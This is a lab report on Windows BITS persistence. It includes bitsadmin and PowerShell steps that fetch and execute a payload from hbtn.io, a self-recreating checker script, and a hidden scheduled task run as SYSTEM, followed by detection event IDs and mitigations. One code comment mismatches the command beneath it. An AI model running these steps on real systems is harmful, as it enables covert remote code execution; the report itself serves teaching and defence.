# BITS Persistence Analysis and Detection Laboratory Report

## 1. Introduction

Background Intelligent Transfer Service (BITS) is a built-in Windows component used by the operating system and various applications to transfer files between client and server systems asynchronously. Services like Windows Update rely on BITS to download updates silently in the background using spare network bandwidth.

Attackers target BITS to establish persistent access and execute binaries on compromised systems. Because network traffic generated by BITS originates from legitimate system binaries like `svchost.exe`, transfers can bypass basic firewalls and network monitoring. Furthermore, BITS jobs survive system reboots, making them an ideal mechanism for stealthy, long-term persistence.

---

## 2. Understanding BITS and Its Capabilities

BITS functions as a job management queue controlled via Component Object Model (COM) interfaces, PowerShell cmdlets, or the command-line utility `bitsadmin.exe`.

Key administrative features include:

* **Asynchronous transfers:** Downloads run in the background regardless of whether a user is actively logged into the system.
* **Bandwidth throttling:** Transfers utilize idle bandwidth, preventing network spikes that could alert system administrators.
* **Notification commands:** BITS allows administrators—or attackers—to attach a callback command (`SetNotifyCmdLine`) that executes automatically when a transfer finishes or encounters an error state.
* **Persistent job storage:** Job state data is written directly to disk inside `%ALLUSERSPROFILE%\Microsoft\Network\Downloader\qmgr*.dat`.

These features make BITS attractive for living-off-the-land (LotL) tactics.

## 3. Creating a BITS Job

This section details how to enumerate, configure, and execute a BITS job using `bitsadmin.exe`.

### Step 1: Enumerate Active Jobs

Before creating a new job, check for any existing transfers running on the target host:

```cmd
bitsadmin /list /allusers /verbose

```

### Step 2: Create the Download and Execution Job

To download a file and automatically execute it upon completion, issue the following sequence in an elevated Command Prompt:

```cmd
:: Create an asynchronous download job named PersistentJob
bitsadmin /create PersistentJob

:: Add the remote file source and local destination path
bitsadmin /addfile PersistentJob "http://hbtn.io/payload.exec" "C:\Users\Public\payload.exec"

:: Set the notification command to execute the file upon successful completion
bitsadmin /setnotifycmdline PersistentJob "C:\Windows\System32\cmd.exe" "/c C:\Users\Public\payload.exec"

:: Configure error handling and retry parameters (60-second retry interval, 86400-second timeout)
bitsadmin /setminretrydelay PersistentJob 60
bitsadmin /setcustomheaders PersistentJob "User-Agent: Mozilla/5.0"

:: Start the transfer job
bitsadmin /resume PersistentJob

```

When the transfer completes, BITS automatically invokes `cmd.exe /c C:\Users\Public\payload.exec` in the background under the security context of the job owner.

## 4. Implementing a Persistence Mechanism

If an administrator cancels or deletes the BITS job during a security sweep, a monitoring checker script must detect its removal and recreate it.

### PowerShell Checker Script (`C:\Users\Public\check.ps1`)

Save the following script to monitor the BITS transfer queue and handle errors:

```powershell
# Define job configuration
$JobName = "PersistentJob"
$SourceUrl = "http://hbtn.io/payload.exec"
$DestPath = "C:\Users\Public\payload.exec"

# 1. Query for existing job
$BitsJob = Get-BitsTransfer -Name $JobName -ErrorAction SilentlyContinue

# 2. Re-create job if missing
if (-not $BitsJob) {
    # Create asynchronous transfer job
    $BitsJob = Start-BitsTransfer -Source $SourceUrl -Destination $DestPath -Asynchronous -DisplayName $JobName

    # Configure job retry parameters
    $BitsJob | Set-BitsTransfer -RetryInterval 60 -RetryTimeout 86400
}

# 3. Handle job state and execution triggers
if ($BitsJob) {
    switch ($BitsJob.JobState) {
        "Transferred" {
            # Finalize transfer and execute payload
            Complete-BitsTransfer -BitsJob $BitsJob
            Start-Process -FilePath $DestPath -WindowStyle Hidden
        }
        "Error" {
            # Restart job if stuck in error state
            Resume-BitsTransfer -BitsJob $BitsJob -ErrorAction SilentlyContinue
        }
    }
}

```

### Automating the Script via Scheduled Task

To ensure the monitoring script runs continuously, register it as a Windows Scheduled Task executing under the `SYSTEM` context every 5 minutes:

```cmd
schtasks /create /tn "BITS_Monitor" /tr "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\Users\Public\check.ps1" /sc minute /mo 5 /ru "NT AUTHORITY\SYSTEM" /f

```

## 5. Detecting and Preventing Malicious BITS Jobs

### Windows Event Log Identifiers

Security teams can detect unauthorized BITS jobs by auditing specific event logs:

| Log Channel | Event ID | Description |
| --- | --- | --- |
| `Microsoft-Windows-BITS-Client/Operational` | **59** | Logged when a new BITS job is created. Identifies the Job Name and User SID. |
| `Microsoft-Windows-BITS-Client/Operational` | **60** | Logged when a BITS transfer completes. |
| `Microsoft-Windows-BITS-Client/Operational` | **16403** | Logged when a command line notification (`SetNotifyCmdLine`) is configured on a job. **High-fidelity detection indicator.** |
| `Security` | **4688** | Process creation log. Captures `bitsadmin.exe` execution along with command-line arguments. |

### Detection Strategies

1. **Monitor Command-Line Arguments:** Set up alert rules for `bitsadmin.exe` executions containing `/setnotifycmdline` or `/addfile` pointing to untrusted directories like `C:\Users\Public\` or `C:\ProgramData\`.
2. **Inspect BITS Client Logs:** Enable operational auditing for `Microsoft-Windows-BITS-Client/Operational` and flag any Event ID **16403** triggers.
3. **Audit Active Queue:** Periodically check the system-wide BITS queue via PowerShell:
```powershell
Get-BitsTransfer -AllUsers | Select-Object DisplayName, JobState, OwnerAccount, RemoteFileName, LocalFileName

```



### Defensive Mitigation

* **Limit Administrator Privileges:** Restrict standard users from creating persistent administrative jobs where possible.
* **Network Edge Filtering:** Restrict outbound HTTP/HTTPS connections initiated by `svchost.exe` (BITS service) to authorized enterprise domains and update endpoints.
* **Block Execution from Public Directories:** Configure AppLocker or Windows Defender Application Control (WDAC) to prevent binary execution from writable paths like `C:\Users\Public\` and `C:\Windows\Temp\`.

---

## 6. Conclusion

BITS persistence demonstrates how builtin administrative utilities can be abused to bypass perimeter defenses and maintain stealthy execution. By abusing `bitsadmin /setnotifycmdline` and combining it with a PowerShell checker task, an attacker can maintain persistence across reboots and defensive cleanups.

Defenders can counter these tactics by enforcing application control, auditing BITS-specific Event IDs (specifically Event ID 16403), and continuously monitoring command-line parameters for anomalous background jobs.
